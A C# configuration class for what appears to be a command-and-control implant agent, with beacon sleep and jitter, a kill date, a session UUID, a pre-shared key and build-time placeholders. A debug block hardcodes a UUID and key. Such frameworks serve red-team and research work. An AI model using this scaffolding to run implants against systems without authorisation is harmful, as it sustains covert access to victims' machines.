using Agent.Interfaces;

namespace Agent.Config
{
    public class AgentConfig : IAgentConfig
    {
        public string? uuid
        {
            get
            {
                return _uuid;
            }
            set
            {
                _uuid = value;
                if (SetAgentConfigUpdated is not null)
                {
                    SetAgentConfigUpdated(this, new EventArgs());
                }
            }
        }
        private string? _uuid;
        public int sleep { get; set; } = 60;
        public int jitter { get; set; } = 10;
        private string? _psk;
        public string? psk
        {
            get
            {
                return _psk;
            }
            set
            {
                _psk = value;
                if(SetAgentConfigUpdated is not null)
                {
                    SetAgentConfigUpdated(this, new EventArgs());
                }
            }
        }
        public DateTime killDate { get; set; }

        public AgentConfig()
        {
#if DEBUG
            sleep = 5;
            jitter = 5;
            uuid = "32857180-3e2c-4ee2-a5f4-33991fb84a80";
            psk = "P9qPKJid5nuxIVprza4F1RkAjwALLdw4RNftgb6FJM4=";
            killDate = DateTime.MaxValue;
#endif
            int _tempInt = 0;
            if(int.TryParse("callback_interval", out _tempInt)){
                sleep = _tempInt;
            }

            if(int.TryParse("callback_jitter", out _tempInt))
            {
                jitter = _tempInt;
            }

            DateTime _killDate = DateTime.MinValue;
            if(DateTime.TryParse("killdate", out _killDate))
            {
                killDate = _killDate;
            }

            //uuid = "%UUID%";

            //psk = "%PSK%";
        }

        public event EventHandler? SetAgentConfigUpdated;
    }
}
